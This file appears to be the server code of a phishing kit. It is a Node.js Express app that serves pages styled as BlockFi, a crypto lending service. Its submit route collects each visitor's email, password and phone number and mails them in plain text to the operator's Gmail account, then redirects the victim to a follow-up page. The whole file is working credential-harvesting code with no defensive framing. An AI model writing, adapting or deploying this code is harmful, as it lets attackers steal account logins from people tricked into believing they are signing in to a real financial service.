require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const path = require("path");
const session = require("express-session");

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Session setup
app.use(
  session({
    secret: process.env.SECRET,
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }, // Set to true in production with HTTPS
  })
);

// EJS setup
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));
app.use(express.static("public"));

// Routes
app.get("/", (req, res) => {
  res.render("BlockFi/blockfi.ejs");
});

app.get("/blockfi/submit/next", (req, res) => {
  res.render("BlockFi/next.ejs");
});

app.post("/blockfi/submit", (req, res) => {
  const { email, password, phone } = req.body;

  if (!email || !password || !phone) {
    return res.status(400).send("Invalid form submission");
  }

  // Configure Nodemailer
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.USER,
      pass: process.env.PASS,
    },
  });

  // Email options
  let mailOptions = {
    from: process.env.USER,
    to: process.env.USER,
    subject: "BlockFi Form Submission",
    text: `Email: ${email}\nPassword: ${password}\nPhone Number: ${phone}`,
  };

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
      return res.status(500).send("Error sending email");
    }
    console.log("Email sent:", info.response);
    res.redirect("/blockfi/submit/next");
  });
});

// Start the server
app.listen(port, () => {
  console.log("Server is listening on port " + port);
});
